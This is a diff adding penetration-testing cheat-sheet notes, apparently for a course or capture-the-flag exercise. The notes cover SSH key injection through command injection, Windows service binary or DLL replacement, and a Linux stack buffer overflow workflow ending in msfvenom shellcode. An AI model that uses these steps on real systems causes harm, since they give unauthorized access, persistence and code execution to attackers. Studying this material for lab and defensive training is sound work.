@@ -679,18 +679,62 @@ john --wordlist=Wordlist.txt shadowfile
     s.connect(("0.0.0.0", 7777))     # Target IP and port, we have a tunnel set up so use quad zeros and whatever port number you used in your tunnel
 IF YOU SEE A WALL OF TEXT YOU SHOULD READ IT, BUT IF YOU'RE LAZY YOUR SHOULD RIGHT CLICK AND VIEW PAGE SOURCE AND FOLLOW ALL LINKS
 
-
-
-
-
-
-
-
-
-
-
-
-
+--- ADDITIONAL ---
+If you get command injection the first step is ssh-key injection  # Day 1
+  Only the Public key because no one wants to see you privates    # rsa.pub
+For malicious file upload 
+  use the shell-code in the FG
+Should always check for robots.txt
+SSH-KEY UPLOAD
+  Step 1. Identify place you can upload key  
+  Step 2. ssh-keygen -t rsa
+    cat ~/.ssh/id_rsa.pub
+  Step 3. using command injection make an ssh directory in the directory of the user you are loging in as   # typicaly www-data who's home directory is www-data
+    ;mkdir .ssh
+  Step 4. upload ssh public key
+    echo "<whatever your key is>" >> /var/www/.ssh/authorized_keys
+--- WINDOWS ---
+BINARY REPLACEMENT OR DLL INJECTION   # if they give you a dll then it is dll injection
+1. Check Services
+  For either blank descriptions or funny descriptions
+2. If you use the GUI and you need to find hidden files
+  go to file explorer, click view and make sure that file name extensions and hidden items are both checked
+3. find the file and see if you can rename it and/or make files and delete them
+  rename the orginal executable
+  drag your executable into the location and rename it to the name the orgnial executable had
+4. Restart the box
+auditpol /get /category:* | findstr /i "success failure"     #  you need to be a privileged user to use this command
+--- LINUX ---
+1. scp the executable back to your linop
+2. run the program
+3. use peda to identify vulnerable functions
+  gdp <name of executable>
+    pdisass main   # ignore anything that has x86
+    pdisass <furthur functions>     # it will never be printf
+4. identify the offset
+  go to wriemask generate a 200 character string and enter it as a string
+    or put it in your script and try it
+      run <<< $(python lin_buf.py)
+  copy the EIP
+  put it in wiremask to get the decimal value
+5. Adjust script "A" * offset#
+6. env - gdb <name of executable>
+  unset env LINES
+  unset env COLUMNS
+  show env
+7. run overflow
+8. info proc map
+9. find /b <heap value start addr>, <stack value end addr>, 0xff, 0xe4
+  grab a handful of addresses
+  paste them and comment them out in your script
+10. reverse the eip value 
+  eip = '\xe3\x7e\xf6\xf7'  :: 0xf7f67ee3
+11. nop sled can be either be 5 10 15   # any one of these is fine, but you want the smallest one possible
+  nop = "\x90" * 15
+12. msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python    # if it doesn't work regenerate it until it does
+13. run it normally
+  sudo ./func <<< $(python <name of function>)
+14. then get the adversaries eip and replace it on your script
 
 
 
